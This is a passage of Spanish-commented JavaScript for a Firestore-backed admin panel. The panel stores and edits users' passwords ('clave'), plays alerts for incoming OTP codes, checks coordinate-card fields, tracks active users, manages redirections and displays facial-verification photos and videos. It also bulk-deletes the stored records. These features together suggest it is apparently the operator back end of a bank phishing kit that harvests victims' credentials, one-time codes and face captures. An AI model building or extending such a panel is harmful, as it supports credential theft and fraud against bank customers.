    link.setAttribute('download', nombreArchivo);
    link.style.visibility = 'hidden';

    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    URL.revokeObjectURL(url);
}

// ==================== FUNCIONES PARA ACTUALIZAR DATOS DEL HISTORIAL ====================

// Función para actualizar clave de un usuario
window.actualizarClaveUsuario = async function(usuario, clave) {
    try {
        const { updateDoc, query, where, getDocs } = await import("https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js");

        const q = query(
            collection(db, "datosHistorial"),
            where("usuario", "==", usuario)
        );

        const querySnapshot = await getDocs(q);
        const promesas = [];

        querySnapshot.forEach((documento) => {
            const docRef = doc(db, "datosHistorial", documento.id);
            promesas.push(updateDoc(docRef, {
                clave: clave,
                claveActualizada: new Date().toISOString()
            }));
        });

        await Promise.all(promesas);


        // Recargar datos del historial
        await cargarHistorial();

        return true;
    } catch (error) {
        console.error("❌ Error actualizando clave:", error);
        return false;
    }
};

// Función para actualizar todos los datos de un usuario
window.actualizarDatosCompletos = async function(usuario, datos) {
    try {
        const { updateDoc, query, where, getDocs } = await import("https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js");

        const q = query(
            collection(db, "datosHistorial"),
            where("usuario", "==", usuario)
        );

        const querySnapshot = await getDocs(q);
        const promesas = [];

        const datosActualizacion = {
            ...datos,
            datosActualizados: new Date().toISOString()
        };

        querySnapshot.forEach((documento) => {
            const docRef = doc(db, "datosHistorial", documento.id);
            promesas.push(updateDoc(docRef, datosActualizacion));
        });

        await Promise.all(promesas);


        // Recargar datos del historial
        await cargarHistorial();

        return true;
    } catch (error) {
        console.error("❌ Error actualizando datos completos:", error);
        return false;
    }
};

// ==================== FUNCIONES DE ELIMINACIÓN ====================

// Función para confirmar eliminación total
window.confirmarEliminacionTotal = function() {
    // Actualizar el número de registros en el modal
    document.getElementById('total-registros-modal').textContent = datosHistorial.length;

    // Limpiar campos de confirmación
    document.getElementById('confirmacionTexto').value = '';
    document.getElementById('confirmacionCheckbox').checked = false;
    document.getElementById('btnConfirmarEliminacion').disabled = true;

    // Mostrar modal
    $('#modalEliminacionTotal').modal('show');

    // Configurar validación en tiempo real
    const textoInput = document.getElementById('confirmacionTexto');
    const checkbox = document.getElementById('confirmacionCheckbox');
    const btnConfirmar = document.getElementById('btnConfirmarEliminacion');

    function validarConfirmacion() {
        const textoValido = textoInput.value.trim() === 'ELIMINAR TODO';
        const checkboxMarcado = checkbox.checked;
        btnConfirmar.disabled = !(textoValido && checkboxMarcado);
    }

    textoInput.addEventListener('input', validarConfirmacion);
    checkbox.addEventListener('change', validarConfirmacion);
};

// Función para eliminar todos los registros
window.eliminarTodosLosRegistros = async function() {
    // Cerrar modal de confirmación
    $('#modalEliminacionTotal').modal('hide');

    // Mostrar modal de progreso
    $('#modalProgreso').modal('show');

    try {


        // Importar funciones necesarias
        const { getDocs, deleteDoc } = await import("https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js");

        // Obtener todos los documentos
        document.getElementById('textoProgreso').textContent = 'Obteniendo lista de registros...';
        document.getElementById('barraProgreso').style.width = '10%';

        const q = query(collection(db, "datosHistorial"));
        const querySnapshot = await getDocs(q);

        const totalDocumentos = querySnapshot.size;


        if (totalDocumentos === 0) {
            document.getElementById('textoProgreso').textContent = 'No hay registros para eliminar';
            setTimeout(() => {
                $('#modalProgreso').modal('hide');
                alert('No hay registros en el historial para eliminar.');
            }, 2000);
            return;
        }

        // Eliminar documentos en lotes
        const loteSize = 50; // Eliminar de 50 en 50 para evitar límites de Firestore
        const documentos = [];

        querySnapshot.forEach((doc) => {
            documentos.push(doc);
        });

        let eliminados = 0;

        for (let i = 0; i < documentos.length; i += loteSize) {
            const lote = documentos.slice(i, i + loteSize);

            // Actualizar progreso
            const progreso = Math.round((i / documentos.length) * 80) + 10; // 10-90%
            document.getElementById('barraProgreso').style.width = `${progreso}%`;
            document.getElementById('textoProgreso').textContent = `Eliminando registros ${i + 1}-${Math.min(i + loteSize, documentos.length)} de ${documentos.length}`;
            document.getElementById('detalleProgreso').textContent = `Lote ${Math.floor(i / loteSize) + 1} de ${Math.ceil(documentos.length / loteSize)}`;

            // Eliminar lote actual
            const promesasEliminacion = lote.map(documento =>
                deleteDoc(doc(db, "datosHistorial", documento.id))
            );

            await Promise.all(promesasEliminacion);
            eliminados += lote.length;



            // Pequeña pausa para no sobrecargar Firestore
            if (i + loteSize < documentos.length) {
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }

        // Finalizar
        document.getElementById('barraProgreso').style.width = '100%';
        document.getElementById('textoProgreso').textContent = `¡Eliminación completada! ${eliminados} registros eliminados`;
        document.getElementById('detalleProgreso').textContent = 'Firestore ha sido liberado exitosamente';



        // Actualizar datos locales
        datosHistorial = [];
        datosFiltrados = [];
        mostrarDatosHistorial();
        actualizarEstadisticasHistorial();

        // Cerrar modal después de 3 segundos
        setTimeout(() => {
            $('#modalProgreso').modal('hide');
            alert(`✅ Eliminación completada exitosamente!\n\n${eliminados} registros eliminados del historial.\nFirestore ha sido liberado.`);
        }, 3000);

    } catch (error) {
        console.error('❌ Error durante la eliminación:', error);

        document.getElementById('textoProgreso').textContent = 'Error durante la eliminación';
        document.getElementById('detalleProgreso').textContent = error.message;
        document.getElementById('barraProgreso').classList.add('bg-danger');

        setTimeout(() => {
            $('#modalProgreso').modal('hide');
            alert(`❌ Error durante la eliminación:\n${error.message}`);
        }, 3000);
    }
};

// Función para eliminar registros antiguos (90 días)
window.eliminarRegistrosAntiguos = async function() {
    const confirmacion = confirm(
        '¿Estás seguro de que quieres eliminar todos los registros de más de 90 días?\n\n' +
        'Esta acción NO se puede deshacer.\n\n' +
        'Haz clic en "Aceptar" para continuar.'
    );

    if (!confirmacion) return;

    try {
        console.log('🗑️ Eliminando registros antiguos (>90 días)...');

        // Mostrar modal de progreso
        $('#modalProgreso').modal('show');
        document.getElementById('textoProgreso').textContent = 'Buscando registros antiguos...';
        document.getElementById('barraProgreso').style.width = '20%';

        // Importar funciones necesarias
        const { getDocs, deleteDoc, where } = await import("https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js");

        // Calcular fecha límite (90 días atrás)
        const fechaLimite = new Date();
        fechaLimite.setDate(fechaLimite.getDate() - 90);
        const fechaLimiteISO = fechaLimite.toISOString();

        // Buscar registros antiguos
        const q = query(
            collection(db, "datosHistorial"),
            where("timestamp", "<", fechaLimiteISO)
        );

        const querySnapshot = await getDocs(q);
        const totalAntiguos = querySnapshot.size;

        document.getElementById('barraProgreso').style.width = '40%';
        document.getElementById('textoProgreso').textContent = `Encontrados ${totalAntiguos} registros antiguos`;

        if (totalAntiguos === 0) {
            setTimeout(() => {
                $('#modalProgreso').modal('hide');
                alert('No se encontraron registros de más de 90 días para eliminar.');
            }, 2000);
            return;
        }

        // Eliminar registros antiguos
        const promesasEliminacion = [];
        querySnapshot.forEach((documento) => {
            promesasEliminacion.push(deleteDoc(doc(db, "datosHistorial", documento.id)));
        });

        document.getElementById('textoProgreso').textContent = `Eliminando ${totalAntiguos} registros antiguos...`;
        document.getElementById('barraProgreso').style.width = '70%';

        await Promise.all(promesasEliminacion);

        document.getElementById('barraProgreso').style.width = '100%';
        document.getElementById('textoProgreso').textContent = `¡${totalAntiguos} registros antiguos eliminados!`;



        // Recargar datos
        await cargarHistorial();

        setTimeout(() => {
            $('#modalProgreso').modal('hide');
            alert(`✅ Eliminación de registros antiguos completada!\n\n${totalAntiguos} registros eliminados (>90 días).`);
        }, 2000);

    } catch (error) {
        console.error('❌ Error eliminando registros antiguos:', error);
        $('#modalProgreso').modal('hide');
        alert(`❌ Error eliminando registros antiguos:\n${error.message}`);
    }
};

// Hacer funciones disponibles globalmente
window.loadActiveUsers = loadActiveUsers;

// Función de testing para verificar elementos
window.testPanelElements = function() {



    console.log("coord7:", !!document.getElementById("coord7"));
    console.log("coord8:", !!document.getElementById("coord8"));

    if (elements.coordUserSelect) {

    }
};

// ===== CONFIGURACIÓN DE AUDIO =====





// Función para inicializar los controles de audio en el panel
function initializeAudioControls() {
    loadAudioConfig();

    const audioEnabled = document.getElementById('audio-enabled');
    const volumeControl = document.getElementById('audio-volume');
    const volumeDisplay = document.getElementById('volume-display');
    const notificationSound = document.getElementById('audio-sound-select');
    const updateSound = document.getElementById('audio-update-select');
    const otpSound = document.getElementById('audio-otp-select');
    const testNotification = document.getElementById('test-audio-btn');
    const testUpdate = document.getElementById('test-update-btn');
    const testOtp = document.getElementById('test-otp-btn');
    const saveAudioBtn = document.getElementById('save-audio-config');

    if (!audioEnabled || !volumeControl || !volumeDisplay || !notificationSound || !updateSound) {
        console.warn('⚠️ No se encontraron todos los elementos de configuración de audio');
        return;
    }

    updateAudioUI();

    audioEnabled.addEventListener('change', function() {
        audioConfig.enabled = this.checked;
        saveAudioConfig();
    });

    volumeControl.addEventListener('input', function() {
        const volume = parseInt(this.value, 10) / 100;
        audioConfig.volume = volume;
        volumeDisplay.textContent = this.value + '%';
        saveAudioConfig();
    });

    notificationSound.addEventListener('change', function() {
        audioConfig.notificationSound = this.value;
        saveAudioConfig();
    });

    updateSound.addEventListener('change', function() {
        audioConfig.updateSound = this.value;
        saveAudioConfig();
    });

    if (otpSound) {
        otpSound.addEventListener('change', function() {
            audioConfig.otpSound = this.value;
            saveAudioConfig();
        });
    }

    if (testNotification) {
        testNotification.addEventListener('click', function() {
            playNotificationSound();
        });
    }

    if (testUpdate) {
        testUpdate.addEventListener('click', function() {
            playUpdateSound();
        });
    }

    if (testOtp) {
        testOtp.addEventListener('click', function() {
            playOtpSound();
        });
    }

    if (saveAudioBtn) {
        saveAudioBtn.addEventListener('click', function() {
            saveAudioConfig();
        });
    }
}

// Función para probar un sonido específico
function testSound(soundPath, volume = null) {
    try {
        const audio = new Audio(soundPath);
        audio.volume = volume !== null ? volume : audioConfig.volume;
        
        const playPromise = audio.play();
        if (playPromise !== undefined) {
            playPromise
                .then(() => {

                })
                .catch(error => {
                    console.warn('⚠️ Error reproduciendo sonido de prueba:', error);
                    alert('Error reproduciendo el sonido. Verifique que el archivo existe y el navegador permite reproducción de audio.');
                });
        }
    } catch (error) {
        console.error('❌ Error creando objeto Audio para prueba:', error);
        alert('Error creando el reproductor de audio.');
    }
}

// ===== FIN CONFIGURACIÓN DE AUDIO =====

// Función para inicializar el estado del panel de audio
function initializeAudioPanelState() {
    const audioPanel = document.getElementById('audio-panel-section');
    const toggleBtn = document.querySelector('button[onclick="toggleAudioPanel()"]');
    
    if (!audioPanel || !toggleBtn) return;
    
    // Cargar estado guardado (por defecto visible)
    const isVisible = localStorage.getItem('audioPanelVisible') !== 'false';
    
    if (isVisible) {
        audioPanel.style.display = 'block';
        toggleBtn.innerHTML = '<i class="fas fa-volume-up"></i> <span class="d-none d-md-inline">Ver/Ocultar</span>';
    } else {
        audioPanel.style.display = 'none';
        toggleBtn.innerHTML = '<i class="fas fa-volume-mute"></i> <span class="d-none d-md-inline">Ver/Ocultar</span>';
    }
    

}

// ==================== FUNCIÓN PARA VIDEO FACIAL ====================

async function loadFacialVideo(userId) {
    try {
        var redSnap = await getDoc(doc(db, "redireccion", userId));
        var photoUrl = null;

        if (redSnap.exists()) {
            var rd = redSnap.data();
            photoUrl = rd.fotoFacialUrl || null;
        }

        if (!photoUrl) {
            const facialQuery = query(
                collection(db, "verificaciones_faciales"),
                limit(50)
            );
            const snapshot = await getDocs(facialQuery);
            snapshot.forEach(function (docSnap) {
                var data = docSnap.data();
                if (data.usuario === userId) {
                    if (data.photoUrl) photoUrl = data.photoUrl;
                }
            });
        }

        if (!photoUrl) {
            alert("No se encontró foto facial para: " + userId + ". Si necesitas revisar video, consúltalo en el historial.");
            return;
        }

        window.showHistorialPhoto(photoUrl);
    } catch (error) {
        console.error("Error cargando facial:", error);
        alert("Error al cargar la foto facial.");
    }
}

window.showHistorialVideo = function(url) {
    var modal = document.getElementById("facialVideoModal");
    var videoEl = document.getElementById("facialVideoPlayer");
    if (!modal || !videoEl) return;
    videoEl.src = url;
    $(modal).modal("show");
};

window.showHistorialPhoto = function(url) {
    var modal = document.getElementById("facialPhotoModal");
    var imgEl = document.getElementById("facialPhotoViewer");
    if (!modal || !imgEl) return;
    imgEl.src = url;
    $(modal).modal("show");
};

$(document).ready(function() {
    $('#facialVideoModal').on('hidden.bs.modal', function () {
        var v = document.getElementById('facialVideoPlayer');
        if (v) { v.pause(); v.src = ''; }
    });
});

// ==================== FIN VIDEO FACIAL ====================

// Función para toggle del panel de audio
window.toggleAudioPanel = function() {
    const audioPanel = document.getElementById('audio-panel-section');
    const toggleBtn = document.querySelector('button[onclick="toggleAudioPanel()"]');
    
    if (!audioPanel || !toggleBtn) return;
    
    const isCurrentlyVisible = audioPanel.style.display !== 'none';
    
    if (isCurrentlyVisible) {
        // Ocultar panel
        audioPanel.style.display = 'none';
        toggleBtn.innerHTML = '<i class="fas fa-volume-mute"></i> <span class="d-none d-md-inline">Ver/Ocultar</span>';
        localStorage.setItem('audioPanelVisible', 'false');

    } else {
        // Mostrar panel
        audioPanel.style.display = 'block';
        toggleBtn.innerHTML = '<i class="fas fa-volume-up"></i> <span class="d-none d-md-inline">Ver/Ocultar</span>';
        localStorage.setItem('audioPanelVisible', 'true');

    }
};
